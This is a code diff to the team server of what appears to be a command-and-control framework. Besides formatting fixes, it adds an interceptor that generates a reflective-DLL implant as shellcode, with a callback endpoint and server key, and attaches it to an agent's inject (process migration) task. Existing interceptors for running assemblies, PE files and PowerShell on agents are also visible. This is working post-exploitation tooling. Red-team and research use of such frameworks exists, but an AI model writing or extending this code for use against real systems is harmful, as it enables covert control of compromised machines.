@@ -33,13 +33,14 @@ namespace TeamServer.Services
             this.Interceptors.Add(new InlineAssemblyInterceptor(this._toolsService));
             this.Interceptors.Add(new ExecutePEInterceptor(this._toolsService, this._configuration));
             this.Interceptors.Add(new PowerShellImportInterceptor(this._toolsService));
+            this.Interceptors.Add(new MigrateInterceptor(this._toolsService, this._configuration));
         }
 
         public InterceptionResult Intercept(AgentTask task, Agent agent)
         {
-            foreach(var interceptor in Interceptors)
+            foreach (var interceptor in Interceptors)
             {
-                if(task.CommandId == interceptor.CommandId)
+                if (task.CommandId == interceptor.CommandId)
                 {
                     var result = interceptor.Intercept(task, agent);
                     if (!result.Success)
@@ -52,8 +53,8 @@ namespace TeamServer.Services
 
     public class InterceptionResult
     {
-        public bool Success { get; set;}
-        public string Error { get; set;}
+        public bool Success { get; set; }
+        public string Error { get; set; }
         public InterceptionResult Succeed()
         {
             this.Success = true;
@@ -71,7 +72,7 @@ namespace TeamServer.Services
 
     public abstract class TaskInterceptor
     {
-        public abstract CommandId CommandId { get;}
+        public abstract CommandId CommandId { get; }
         public abstract InterceptionResult Intercept(AgentTask task, Agent agent);
 
         public InterceptionResult Failed(string error)
@@ -138,7 +139,7 @@ namespace TeamServer.Services
             string tmpFilePath = this._folderConfig.NewTempFile();
             PayloadGenerator generator = new PayloadGenerator(this._folderConfig, this._spawnConfig);
             ExecuteResult result = null;
-            if(tool.Type == Common.APIModels.ToolType.Exe)
+            if (tool.Type == Common.APIModels.ToolType.Exe)
                 result = generator.GenerateBinForExe(_toolsService.GetToolPath(tool), tmpFilePath, agent.Metadata.Architecture == "x86", task.HasParameter(ParameterId.Parameters) ? task.GetParameter<string>(ParameterId.Parameters) : null);
             if (tool.Type == Common.APIModels.ToolType.DotNet)
                 result = generator.GenerateBinForAssembly(_toolsService.GetToolPath(tool), tmpFilePath, agent.Metadata.Architecture == "x86", task.HasParameter(ParameterId.Parameters) ? task.GetParameter<string>(ParameterId.Parameters) : null);
@@ -174,6 +175,60 @@ namespace TeamServer.Services
             if (tool.Type != Common.APIModels.ToolType.Powershell)
                 return Failed($"Tool {toolName} is not a valid Powershell script !");
             task.Parameters.AddParameter(ParameterId.File, tool.Data);
+            return Succeed();
+        }
+    }
+
+    public class MigrateInterceptor : TaskInterceptor
+    {
+        private readonly IToolsService _toolsService;
+        private readonly IConfiguration _configuration;
+        private FoldersConfig _folderConfig;
+        private SpawnConfig _spawnConfig;
+        public MigrateInterceptor(IToolsService toolService, IConfiguration configuration)
+        {
+            _toolsService = toolService;
+            _configuration = configuration;
+
+            this._folderConfig = _configuration.FoldersConfigs();
+            this._spawnConfig = _configuration.SpawnConfigs();
+        }
+        public override CommandId CommandId { get => CommandId.Inject; }
+
+        public override InterceptionResult Intercept(AgentTask task, Agent agent)
+        {
+            if (!task.HasParameter(ParameterId.Name))
+                task.Parameters.AddParameter(ParameterId.Name, "ReflectiveFunction");
+
+            if (!task.HasParameter(ParameterId.Target))
+                return Failed("Missing Target architecture");
+
+            if (!task.HasParameter(ParameterId.Bind))
+                return Failed("Missing Endpoint");
+
+            PayloadGenerator generator = new PayloadGenerator(this._folderConfig, this._spawnConfig);
+            ImplantConfig config = new ImplantConfig()
+            {
+                Architecture = task.GetParameter<string>(ParameterId.Target) == "x86" ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
+                Type = ImplantType.ReflectiveLibrary,
+                ImplantName = Payload.GenerateName(),
+                IsDebug = false,
+                IsInjected = false,
+                Endpoint = ConnexionUrl.FromString(task.GetParameter<string>(ParameterId.Bind)),
+                ServerKey = _configuration.GetValue<string>("ServerKey")
+            };
+
+            string logs = string.Empty;
+            generator.MessageSent += (sender, message) =>
+            {
+                logs += message.ToString() + Environment.NewLine;
+            };
+            var data = generator.GenerateImplant(config);
+
+            if (data == null)
+                return Failed("Unable to generate ShellCode Data." + Environment.NewLine + logs);
+
+            task.Parameters.AddParameter(ParameterId.File, data);
             return Succeed();
         }
     }
